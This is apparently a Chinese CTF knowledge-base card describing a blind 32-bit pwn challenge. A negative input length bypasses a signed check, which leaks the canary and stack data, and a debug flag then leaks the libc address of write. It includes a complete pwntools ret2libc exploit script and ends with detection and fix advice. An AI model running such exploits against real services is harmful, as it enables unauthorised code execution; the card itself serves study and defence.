---
id: ctf-pwn-blind-negative-length-stack-leak-debug-write-ret2libc
title: blind pwn：负数长度符号绕过泄露栈/canary + debug 泄露 write 地址后 ret2libc
type: scenario
domain: ctf
path: ctf/pwn
technique: blind-negative-length-stack-leak-debug-libc-ret2libc
tags:
- ctf
- pwn
- blind-pwn
- integer-signedness
- stack-leak
- canary
- libc-leak
- ret2libc
- debug-leak
- x86
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V245
  verified_at: '2026-11-07T13:13:34+08:00'
  notes: 已对照原文与14张图核对：长度16上限/-1绕过（图01/09）、%p无效（图02/03）、DEBUG写回显（图04/05/08）、0x11覆盖到canary、0x107字节回显含canary与0xf7开头32位地址（图08）、DEBUG Calling write 泄露write地址（图09）、最终 ls/cat flag 拿 shell（图10）均与卡片一致；卡内 0x11、write偏移0x108630、system 0x047cd0、/bin/sh 0x1b90d5、libc6-i386_2.35 均来自原文。注意：staging 文件名与 cards.json 的 id 少写“-write-”，实际 KB id/正文 frontmatter 为 ...-debug-write-ret2libc，已按实际 id verify。未验证点：未复跑；原文多次二分试错，卡内偏移/槽位需按实际栈帧调整已注明。
url: /docs/ctf/pwn/ctf-pwn-blind-negative-length-stack-leak-debug-write-ret2libc/
draft: false
kb_aliases:
- blindpwn
- 盲打 pwn
- 负数长度绕过
- 有符号数转无符号数
- 栈数据泄露泄 canary
- debug 模式泄露 write
- 32 位 ret2libc
---

## 一句话结论

程序用有符号整数接收输入长度，负数长度通过“最大长度”检查后被当作无符号大数传给读取/回显逻辑，导致栈缓冲区越界读写：一次输入即可从回显中拿到 canary、保存的 ebp 和返回地址（代码基址）；再把返回地址改成调用 vuln 的 call 指令地址（泄露返回值减一个固定小偏移）让函数重复执行，并利用返回地址下方的 debug 标志位开启 debug，泄露出 `write` 的真实地址，最后回填 canary、按 32 位 cdecl 布局 ret2libc 执行 `system("/bin/sh")`。

## 原理

- **长度符号绕过**：输入长度用有符号 `int` 接收（如 `atoi`/`scanf` 后存 int），只用 `len > 16` 这类正数上限做检查；输入 `-1` 时检查通过。随后 `read(0, buf, len)` / `write(1, buf, len)` 的参数被转换为 `size_t`，`-1` 变成 `0xFFFFFFFF`（或按实现截断成大数），程序实际按巨大长度处理，远超栈缓冲区 `buf` 的真实大小。
- **越界回显泄栈**：程序把读入的 `buf` 按同一个大长度 `write(1, buf, n)` 回显时，会把缓冲区之后、尚未被覆盖的栈内容一并输出。实测输入 17 字节（0x11）时，缓冲区后紧跟 canary、保存的 ebp、返回地址及栈上的 libc 指针，按小端每 4 字节解析即可分别得到 canary、`saved_ebp` 和代码地址；这也是“blind”（无二进制/无源码）情况下确定偏移与位数的依据。
- **为什么 0x11 是 canary 偏移**：程序栈帧为 `char buf[N]` + canary + saved ebp + ret，题目实际布局中 `buf` 可用区到 canary 为 0x11 字节（非 4 字节对齐，说明中间还夹有局部变量/对齐填充）；用二分法改变输入长度、观察回显中 canary 特征字节（末字节为 `\x00`，本例泄漏值以 `f7` 开头、处于 32 位地址区间）即可定位。
- **重复执行与 debug 开关**：泄露出的返回地址减去 7 得到该函数被调用处的 `call` 指令地址；把返回地址改成它，函数返回后会再次执行 `call vuln`，于是还能再输入一轮。debug 标志位于返回地址下方的栈槽，第二轮 payload 在该槽填入非零值后，程序进入 debug 分支并调用 `write` 打印其 libc 地址，从而补上 libc 基址。
- **ret2libc**：32 位程序 canary 已泄露、libc 版本由泄漏的 `write` 地址比对确定（本例为 `libc6-i386_2.35-0ubuntu3.10_amd64`），第三次输入回填 canary 与保存的 ebp，把返回地址改为 `system`，按 cdecl 在栈上依次放 `system` 返回地址（可填 0）与 `"/bin/sh"` 指针，函数返回即拿到 shell。

## 触发条件

- 长度参数为有符号类型，检查只覆盖正数上限（如 `len > 16`），未同时拒绝 `len <= 0`，也未与 `sizeof(buf)` 做无符号安全比较。
- 同一长度值同时用于 `read` 与 `write`（或类似的 memcpy/回显），且会经由 `size_t`/无符号类型转换，使负值变成巨大长度。
- 栈缓冲区附近存在可被越界读出的 canary、保存的 ebp、返回地址或 libc 指针（未开启或已开启 canary 均可，前者可直接溢出，后者需先泄露）。
- 程序存在循环调用同一处理函数的逻辑，或返回地址可被引导回调用点，使攻击者获得第二次/第三次输入机会。
- 存在 debug/verbose 开关，开启后会打印 libc 函数真实地址。

## 利用步骤

1. 探测长度上限（如 16），再输入 `-1`/其他负数，观察输出长度是否变长、是否读入超过上限的数据，确认有符号/无符号转换。
2. 输入 `-1` 长度，再发送 0x11 字节填充，逐 4 字节解析回显：定位 canary（末字节通常为 `\x00`）、保存的 ebp 与代码返回地址；位数可由地址高字节（如 `0xf7`）判断为 32 位。
3. 构造第二轮 payload：`0x11` 填充 + canary + 若干栈帧填充 + 泄露的保存 ebp + `(泄露返回地址 - 7)` 回到调用点，并在返回地址下方的 debug 槽填非零值。
4. 接收 debug 输出中的 `write <hex>`，减去 `write` 在该 libc 中的偏移得到 `libc_base`（本例偏移 `0x108630`）。
5. 第三次发送 `-1` 长度并构造 ret2libc：`0x11` 填充 + canary + 保存 ebp/栈帧填充 + `system` + 0 + `"/bin/sh"`（偏移本例 `system=0x047cd0`、`/bin/sh=0x1b90d5`），随后交互执行命令读取 flag。

## PoC

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug')
p = remote('TARGET', PORT)

# 1) 负数长度 -> 越界回显，泄露 canary / saved ebp / 代码地址
p.recvuntil(b"Len:\n"); p.sendline(b"-1")
p.recvuntil(b"Data:\n"); p.send(b"a" * 0x11)
p.recvuntil(b"a" * 0x11)
canary = u32(p.recv(4))
p.recv(8)                       # 按实际回显布局调整
saved_ebp = u32(p.recv(4))
code_ret = u32(p.recv(4))

# 2) 返回调用点重新执行，并在返回地址下方槽位开启 debug
p.sendline(b"-1")
p.recvuntil(b"Data:\n")
p.send(b"a" * 0x11 + p32(canary) + p32(1) * 2 + p32(saved_ebp) +
      p32(code_ret - 7) + p32(1))
p.recvuntil(b"write <")
libc_base = int(p.recv(10), 16) - 0x108630   # write 偏移按实际 libc 调整

# 3) ret2libc
p.recvuntil(b"Len:\n"); p.sendline(b"-1")
p.recvuntil(b"Data:\n")
p.send(b"a" * 0x11 + p32(canary) + p32(1) * 3 +
      p32(libc_base + 0x047cd0) + p32(0) + p32(libc_base + 0x1b90d5))
p.interactive()
```

说明：偏移 0x11、`code_ret - 7`、debug 槽位置与 `p32(1)` 填充个数均由实际栈帧决定，需按调试结果调整；原文环境为 32 位、libc `libc6-i386_2.35-0ubuntu3.10_amd64`。

## 变体与关联

- 变体：长度类型可为 `int16/int32`，检查可能是 `> max`、`abs(len)`、`len & 0xffff`；本质都是“检查时与使用时对同一值的解释不一致”。
- 变体：没有 `write` 回显时，可用 `printf("%s")`、未初始化栈、`send` 等泄露 canary/libc；有 debug 端点时可直接拿函数地址，跳过回显泄露。
- 变体：无法回到调用点时，可用 `leave; ret` 栈迁移或 partial overwrite 制造二次输入；64 位下需相应调整 canary 偏移与调用约定（`pop rdi` 传参）。
- 关联：[[ctf-pwn-int16-length-sign-bypass-sprintf-format-canary-orw]]（int16 符号绕过 + canary 泄露）、[[ctf-pwn-blind-format-string-dump-binary-got-hijack]]（盲打场景下泄露二进制并劫持 GOT）、[[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]（无 `/bin/sh` 的两段 ret2libc）。
- 边界：若 `read` 前用 `min(len, sizeof(buf))` 限制、或用无符号类型统一校验，则越界不成立；libc 偏移随目标镜像变化，需用泄露地址比对 libc 数据库。

## 检测与防御

- 检测（CTF/审计）：输入负数长度后程序输出长度异常增大、回显中出现大量栈地址/`0xf7` 开头的字；二进制中存在“长度上限检查”但后续 `read/write` 使用同一有符号变量。
- 修复：长度用无符号类型接收，先拒绝 `<= 0`，再与 `sizeof(buf)` 比较；读取/回显均使用实际读到的字节数；对 `read` 返回值做检查。
- 加固：开启 Canary、PIE、NX、Full RELRO；关闭生产环境 debug 输出；避免在循环中复用同一易溢出函数。
